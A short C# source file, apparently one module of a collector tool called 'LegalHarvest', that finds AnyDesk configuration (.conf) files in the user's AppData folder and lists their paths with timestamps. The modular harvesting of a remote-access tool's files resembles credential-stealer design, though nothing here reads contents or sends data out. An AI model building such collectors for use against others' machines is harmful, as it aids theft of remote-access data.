using System;
using System.Collections.Generic;
using System.IO;

namespace LegalHarvest.Modules
{
    public class AnyDeskModule : ICollectorModule
    {
        public string ModuleName => "AnyDesk";
        public bool CanExecute()
        {
            string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "AnyDesk");
            return Directory.Exists(path);
        }

        public List<CollectedItem> Collect()
        {
            var items = new List<CollectedItem>();
            string anyDeskDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "AnyDesk");
            if (Directory.Exists(anyDeskDir))
                foreach (string file in Directory.GetFiles(anyDeskDir, "*.conf", SearchOption.AllDirectories))
                    items.Add(new CollectedItem { Category = "AnyDesk", Name = file, Value = file, Timestamp = DateTime.Now });
            return items;
        }
    }
}
